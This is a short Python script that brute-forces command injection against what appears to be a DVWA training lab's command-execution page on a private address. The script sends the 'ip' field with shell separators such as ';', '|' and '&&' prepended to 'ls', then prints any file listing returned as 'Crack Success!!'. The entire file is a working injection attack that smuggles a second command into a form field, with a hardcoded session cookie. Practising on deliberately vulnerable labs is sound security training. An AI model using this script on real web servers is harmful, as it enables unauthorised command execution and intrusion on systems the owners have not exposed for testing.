import requests
import re
from time import sleep

cmd = ['&',';', '|', '-','$','||']


URL="http://10.0.2.13:8080/vulnerabilities/exec/"

cookie={
        "PHPSESSID":"4d4v36d8eindghvkdmct5oenb4",
        "security":"low"
        }

session1=requests.Session()

for i in cmd:
    data = {
            "ip":i+"ls",
            "Submit":"Submit"
        }
    
    req=session1.post(URL,cookies=cookie,data=data)
    success=re.search(r'<pre>(?P<file>.*)</pre>',req.text,re.DOTALL)
    filelist=success.group("file")
    if(len(filelist)>1):
        print("inject : "+i+"ls")
        print("--File List--\n")
        print(filelist)
        print("\n")
        print("Crack Success!!")
        print("\n\n==================\n\n")
        sleep(2)
    else:
        print("Crack Failed")
        print("\n\n##################\n\n")
        sleep(2)
